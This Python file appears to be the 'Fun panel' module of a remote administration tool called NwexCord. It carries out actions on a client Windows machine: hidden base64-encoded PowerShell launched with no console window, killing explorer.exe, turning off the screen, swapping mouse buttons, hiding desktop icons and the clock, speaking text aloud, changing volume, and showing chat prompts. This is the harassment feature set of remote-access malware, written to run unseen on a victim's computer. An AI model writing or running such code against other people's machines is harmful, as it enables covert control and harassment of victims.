import subprocess
import ctypes
import threading
import os
import webbrowser


class FunManager:
    """Helper class for Fun panel operations."""
    
    @staticmethod
    def open_url(url: str):
        try:
            webbrowser.open(url)
            return True, f"Opened: {url}"
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def show_messagebox(title: str, message: str, icon="Information", button="OK"):
        try:
            icon_flags = {"Information": 0x40, "Error": 0x10, "Warning": 0x30, "Question": 0x20}
            button_flags = {"OK": 0x0, "OKCancel": 0x01, "YesNo": 0x04, "YesNoCancel": 0x03, "RetryCancel": 0x05, "AbortRetryIgnore": 0x02}
            flags = icon_flags.get(icon, 0x40) | button_flags.get(button, 0x0) | 0x00040000
            WS_EX_TOOLWINDOW = 0x00000080
            WS_POPUP = 0x80000000
            hwnd = ctypes.windll.user32.CreateWindowExW(WS_EX_TOOLWINDOW, "Static", "", WS_POPUP, 0, 0, 0, 0, 0, 0, 0, 0)
            result = ctypes.windll.user32.MessageBoxW(hwnd, message, title, flags)
            ctypes.windll.user32.DestroyWindow(hwnd)
            return True, f"MessageBox shown. Result: {result}"
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def show_balloon_tip(title: str, text: str, icon="Info"):
        try:
            icon_map = {"Info": "Info", "Warning": "Warning", "Error": "Error", "None": "None"}
            ps_icon = icon_map.get(icon, "Info")
            title_esc = title.replace("'", "''")
            text_esc = text.replace("'", "''")
            script = (
                f"Add-Type -AssemblyName System.Windows.Forms\n"
                f"Add-Type -AssemblyName System.Drawing\n"
                f"$n = New-Object System.Windows.Forms.NotifyIcon\n"
                f"$n.Icon = [System.Drawing.SystemIcons]::Information\n"
                f"$n.BalloonTipTitle = '{title_esc}'\n"
                f"$n.BalloonTipText = '{text_esc}'\n"
                f"$n.BalloonTipIcon = [System.Windows.Forms.ToolTipIcon]::{ps_icon}\n"
                f"$n.Visible = $true\n"
                f"$n.ShowBalloonTip(5000)\n"
                f"Start-Sleep -Seconds 6\n"
                f"$n.Dispose()"
            )
            encoded = base64.b64encode(script.encode('utf-16-le')).decode()
            subprocess.Popen(f'powershell -WindowStyle Hidden -EncodedCommand {encoded}', shell=True, creationflags=0x08000000)
            return True, f"BalloonTip shown: {title}"
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def client_chat_input(message: str):
        """Show an InputBox on client and return the typed response."""
        try:
            msg_esc = message.replace("'", "''")
            script = f"Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::InputBox('{msg_esc}', 'NwexCord Chat')"
            encoded = base64.b64encode(script.encode('utf-16-le')).decode()
            result = subprocess.run(
                f'powershell -WindowStyle Hidden -EncodedCommand {encoded}',
                shell=True, capture_output=True, text=True, timeout=300,
                encoding='utf-8', errors='replace'
            )
            response = result.stdout.strip()
            return response if response else None
        except Exception:
            return None
    
    @staticmethod
    def clock_show():
        try:
            tray = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
            notify = ctypes.windll.user32.FindWindowExW(tray, 0, "TrayNotifyWnd", None)
            clock = ctypes.windll.user32.FindWindowExW(notify, 0, "TrayClockWClass", None)
            if clock:
                ctypes.windll.user32.ShowWindow(clock, 5)
                return True, "Clock shown."
            return False, "Clock window not found."
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def clock_hide():
        try:
            tray = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
            notify = ctypes.windll.user32.FindWindowExW(tray, 0, "TrayNotifyWnd", None)
            clock = ctypes.windll.user32.FindWindowExW(notify, 0, "TrayClockWClass", None)
            if clock:
                ctypes.windll.user32.ShowWindow(clock, 0)
                return True, "Clock hidden."
            return False, "Clock window not found."
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def explorer_kill():
        try:
            subprocess.run('taskkill /F /IM explorer.exe', shell=True, timeout=10, capture_output=True, text=True)
            return True, "Explorer killed."
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def explorer_start():
        try:
            subprocess.Popen('explorer.exe', shell=True)
            return True, "Explorer started."
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def desktop_icons_show():
        try:
            progman = ctypes.windll.user32.FindWindowW("Progman", "Program Manager")
            defview = ctypes.windll.user32.FindWindowExW(progman, 0, "SHELLDLL_DefView", None)
            if not defview:
                from ctypes import wintypes
                WNDENUMPROC = ctypes.WINFUNCTYPE(ctypes.c_bool, wintypes.HWND, wintypes.LPARAM)
                found = [0]
                def cb(hwnd, lp):
                    dv = ctypes.windll.user32.FindWindowExW(hwnd, 0, "SHELLDLL_DefView", None)
                    if dv: found[0] = dv; return False
                    return True
                ctypes.windll.user32.EnumWindows(WNDENUMPROC(cb), 0)
                defview = found[0]
            if defview:
                lv = ctypes.windll.user32.FindWindowExW(defview, 0, "SysListView32", None)
                if lv:
                    ctypes.windll.user32.ShowWindow(lv, 5)
                    return True, "Desktop icons shown."
            return False, "Desktop view not found."
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def desktop_icons_hide():
        try:
            progman = ctypes.windll.user32.FindWindowW("Progman", "Program Manager")
            defview = ctypes.windll.user32.FindWindowExW(progman, 0, "SHELLDLL_DefView", None)
            if not defview:
                from ctypes import wintypes
                WNDENUMPROC = ctypes.WINFUNCTYPE(ctypes.c_bool, wintypes.HWND, wintypes.LPARAM)
                found = [0]
                def cb(hwnd, lp):
                    dv = ctypes.windll.user32.FindWindowExW(hwnd, 0, "SHELLDLL_DefView", None)
                    if dv: found[0] = dv; return False
                    return True
                ctypes.windll.user32.EnumWindows(WNDENUMPROC(cb), 0)
                defview = found[0]
            if defview:
                lv = ctypes.windll.user32.FindWindowExW(defview, 0, "SysListView32", None)
                if lv:
                    ctypes.windll.user32.ShowWindow(lv, 0)
                    return True, "Desktop icons hidden."
            return False, "Desktop view not found."
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def screen_off():
        try:
            ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
            return True, "Screen turned off."
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def screen_on():
        try:
            ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, -1)
            ctypes.windll.user32.mouse_event(0x0001, 0, 1, 0, 0)
            return True, "Screen turned on."
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def swap_mouse_normal():
        try:
            ctypes.windll.user32.SwapMouseButton(False)
            return True, "Mouse buttons set to normal."
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def swap_mouse_swap():
        try:
            ctypes.windll.user32.SwapMouseButton(True)
            return True, "Mouse buttons swapped."
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def text_speak(text: str):
        try:
            text_escaped = text.replace("'", "''")
            script = f"$voice = New-Object -ComObject SAPI.SpVoice; $voice.Speak('{text_escaped}')"
            encoded = base64.b64encode(script.encode('utf-16-le')).decode()
            subprocess.Popen(f'powershell -WindowStyle Hidden -EncodedCommand {encoded}', shell=True, creationflags=0x08000000)
            return True, f"Speaking: {text}"
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def volume_up():
        try:
            for _ in range(13):
                ctypes.windll.user32.keybd_event(0xAF, 0, 0, 0)
                ctypes.windll.user32.keybd_event(0xAF, 0, 0x0002, 0)
            return True, "Volume +25%"
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def volume_down():
        try:
            for _ in range(13):
                ctypes.windll.user32.keybd_event(0xAE, 0, 0, 0)
                ctypes.windll.user32.keybd_event(0xAE, 0, 0x0002, 0)
            return True, "Volume -25%"
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def volume_mute():
        try:
            ctypes.windll.user32.keybd_event(0xAD, 0, 0, 0)
            ctypes.windll.user32.keybd_event(0xAD, 0, 0x0002, 0)
            return True, "Volume muted/unmuted."
        except Exception as e:
            return False, str(e)


